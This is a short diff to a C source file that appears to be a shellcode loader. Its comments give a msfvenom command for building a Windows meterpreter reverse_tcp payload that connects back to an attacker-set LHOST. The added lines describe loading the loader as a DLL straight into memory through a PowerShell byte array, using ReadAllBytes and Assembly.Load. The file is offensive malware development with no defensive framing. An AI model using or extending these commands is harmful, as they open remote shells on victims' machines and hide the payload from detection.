@@ -61,3 +61,7 @@ int main() {
 }
 
 //generate shellcode with msfvenom:  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YourIP> LPORT=<Port> -f c
+//Final Evolution: cradle in a DLL and Refectively call the dll with a powershell byte array
+//Powershell Reflective DLL Code: 
+// $bytes = [System.IO.File]::ReadAllBytes('C:\temp\mytestlib.dll') 
+//$assembly = [System.Reflection.Assembly]::Load($bytes)
